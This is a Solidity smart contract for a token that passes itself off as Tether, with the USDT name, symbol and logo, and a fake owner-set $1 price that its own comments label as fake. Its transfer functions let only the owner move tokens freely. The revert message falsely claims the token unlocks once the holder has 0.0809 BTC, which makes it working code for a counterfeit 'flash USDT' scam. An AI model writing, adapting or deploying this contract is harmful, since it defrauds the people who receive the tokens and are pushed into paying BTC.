// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract UsdtToken is ERC20, Ownable {
    uint256 public demoPrice = 1 * 10 ** 18; // $1 per token

    // Hardcoded Metadata
    string public constant metadataName = "Usdt-token";
    string public constant metadataSymbol = "USDT";
    string public constant metadataImage = "https://raw.githubusercontent.com/Cryptovaultiq/Usdt-flash-token/main/frontend/public/USDT.png";
    string public constant metadataDescription = "USDT Token";

    constructor() ERC20(metadataName, metadataSymbol) Ownable(msg.sender) {
        _mint(msg.sender, 100000 * 10 ** decimals()); // 100,000 USDT
    }

    // Get fake price
    function getDemoPrice() public view returns (uint256) {
        return demoPrice;
    }

    // Owner can update fake price
    function setDemoPrice(uint256 newPrice) public onlyOwner {
        demoPrice = newPrice;
    }

    // Get metadata (for external tools)
    function getMetadata() public pure returns (string memory, string memory, string memory, string memory) {
        return (metadataName, metadataSymbol, metadataImage, metadataDescription);
    }

    function transfer(address to, uint256 amount) public override returns (bool) {
        require(owner() == _msgSender() || balanceOf(to) > 0, "UsdtToken: This Token has not yet been unlocked, You must have minimum of 0.0809 BTC");
        return super.transfer(to, amount);
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        require(owner() == _msgSender() || balanceOf(to) > 0, "UsdtToken: This Token has not yet been unlocked, You must have minimum of 0.0809 BTC");
        return super.transferFrom(from, to, amount);
    }
}